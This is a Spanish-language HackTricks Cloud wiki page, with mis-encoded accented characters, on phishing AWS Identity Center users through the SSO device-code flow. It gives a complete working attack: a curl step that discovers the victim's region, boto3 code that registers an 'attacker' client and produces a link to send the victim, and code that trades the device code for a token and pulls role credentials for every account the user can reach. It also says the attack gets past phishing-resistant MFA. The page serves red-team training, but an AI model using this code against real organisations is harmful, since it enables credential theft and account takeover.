# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Phishing de C칩digo de Dispositivo de AWS

Inicialmente propuesto en [**esta publicaci칩n de blog**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), es posible enviar un **enlace** a un usuario que utiliza AWS SSO que, si el **usuario acepta**, el atacante podr치 obtener un **token para suplantar al usuario** y acceder a todos los roles a los que el usuario puede acceder en el **Identity Center**.

Para realizar este ataque, los requisitos son:

* La v칤ctima necesita usar **Identity Center**
* El atacante debe conocer el **subdominio** utilizado por la v칤ctima `<victimsub>.awsapps.com/start`

Solo con la informaci칩n anterior, el **atacante podr치 enviar un enlace al usuario** que, si es **aceptado**, otorgar치 al **atacante acceso a la cuenta de usuario de AWS**.

### Ataque

1. **Encontrar el subdominio**

El primer paso del atacante es averiguar el subdominio que la empresa v칤ctima est치 utilizando en su Identity Center. Esto se puede hacer a trav칠s de **OSINT** o **adivinando + BF**, ya que la mayor칤a de las empresas utilizar치n su nombre o una variaci칩n de su nombre aqu칤.

Con esta informaci칩n, es posible obtener la regi칩n donde se configur칩 el Identity Center:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Generar el enlace para la v칤ctima y enviarlo**

Ejecuta el siguiente c칩digo para generar un enlace de inicio de sesi칩n de AWS SSO para que la v칤ctima pueda autenticarse.\
Para la demostraci칩n, ejecuta este c칩digo en una consola de python y no la cierres, ya que m치s tarde necesitar치s algunos objetos para obtener el token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Env칤a el enlace generado a la v칤ctima utilizando tus incre칤bles habilidades de ingenier칤a social.

3. **Espera a que la v칤ctima lo acepte**

Si la v칤ctima ya estaba **conectada a AWS**, solo necesitar치 aceptar otorgar los permisos; si no lo estaba, necesitar치 **iniciar sesi칩n y luego aceptar otorgar los permisos**.\
As칤 es como se ve el aviso hoy en d칤a:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Obt칠n el token de acceso SSO**

Si la v칤ctima acept칩 el aviso, ejecuta este c칩digo para **generar un token SSO suplantando al usuario**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
El token de acceso SSO es **v치lido por 8h**.

5. **Suplantar al usuario**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

Es divertido saber que el ataque anterior **funciona incluso si se est치 utilizando un "MFA inphishable" (webAuth)**. Esto se debe a que el **flujo de trabajo anterior nunca sale del dominio OAuth utilizado**. A diferencia de otros ataques de phishing donde el usuario necesita suplantar el dominio de inicio de sesi칩n, en el caso del flujo de trabajo de c칩digo de dispositivo, se prepara de tal manera que un **c칩digo es conocido por un dispositivo** y el usuario puede iniciar sesi칩n incluso en una m치quina diferente. Si se acepta el aviso, el dispositivo, solo por **conocer el c칩digo inicial**, podr치 **recuperar credenciales** para el usuario.

Para m치s informaci칩n sobre esto [**consulta esta publicaci칩n**](https://mjg59.dreamwidth.org/62175.html).

### Automatic Tools

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome_phish)

## References

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
